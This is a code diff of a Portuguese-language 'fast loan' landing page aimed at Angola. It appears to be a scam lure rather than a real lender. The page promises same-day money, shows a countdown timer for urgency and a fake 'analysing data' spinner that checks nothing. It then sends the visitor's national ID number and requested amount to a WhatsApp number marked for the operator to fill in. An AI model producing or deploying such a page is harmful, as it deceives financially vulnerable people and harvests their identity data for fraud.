@@ -6,7 +6,6 @@
     <title>💰 Empréstimo Rápido Angola</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
         body { font-family: 'Inter', sans-serif; background-color: #000; color: white; }
         .bg-custom { background: linear-gradient(to bottom right, #0a1f1a, #000); }
         input[type=range] { -webkit-appearance: none; width: 100%; background: transparent; }
@@ -21,4 +20,60 @@
     </div>
 
     <div class="max-w-xl mx-auto px-4 py-10">
-        <div class="text-center mb-1
+        <div class="text-center mb-10">
+            <span class="bg-emerald-500/20 text-emerald-400 px-4 py-1 rounded-full text-xs font-bold border border-emerald-500/30">
+                ✅ APROVAÇÃO VIA WHATSAPP
+            </span>
+            <h1 class="text-4xl font-extrabold mt-4">DINHEIRO NA CONTA <br><span class="text-[#00f5c8]">HOJE MESMO!</span></h1>
+        </div>
+
+        <form id="loanForm" class="bg-white/10 backdrop-blur-md p-6 rounded-3xl border border-white/10 space-y-6">
+            <div>
+                <label class="block text-sm mb-4">💰 Quanto você precisa?</label>
+                <input type="range" id="valor" min="20000" max="1500000" step="10000" value="250000">
+                <div class="flex justify-between mt-2 font-bold">
+                    <span id="valorDisplay" class="text-2xl text-[#00f5c8]">250.000 Kz</span>
+                </div>
+            </div>
+
+            <div class="space-y-4">
+                <input type="text" id="bin" placeholder="Número do seu BIN" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none" required>
+                <input type="text" id="objetivo" placeholder="Para que usará o dinheiro?" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none" required>
+            </div>
+
+            <button type="submit" class="w-full bg-[#00f5c8] text-black font-black py-4 rounded-xl text-lg hover:brightness-110 transition">
+                SOLICITAR AGORA!
+            </button>
+        </form>
+
+        <div id="loading" class="hidden fixed inset-0 bg-black/95 flex items-center justify-center z-50 text-center p-6">
+            <div>
+                <div class="w-16 h-16 border-4 border-[#00f5c8] border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+                <h2 class="text-2xl font-bold mb-2">Analisando dados...</h2>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const vInput = document.getElementById('valor');
+        const vDisplay = document.getElementById('valorDisplay');
+        vInput.oninput = () => vDisplay.innerText = parseInt(vInput.value).toLocaleString('pt-BR') + ' Kz';
+
+        let t = 179;
+        setInterval(() => {
+            const m = Math.floor(t/60); const s = t%60;
+            document.getElementById('timer').innerText = `0${m}:${s<10?'0':''}${s}`;
+            if(t > 0) t--;
+        }, 1000);
+
+        document.getElementById('loanForm').onsubmit = (e) => {
+            e.preventDefault();
+            document.getElementById('loading').classList.remove('hidden');
+            setTimeout(() => {
+                const msg = encodeURIComponent(`Olá! Quero meu empréstimo!\nBIN: ${document.getElementById('bin').value}\nValor: ${vInput.value} Kz`);
+                window.location.href = `https://wa.me/244920000000?text=${msg}`; // AJUSTE O NÚMERO AQUI
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
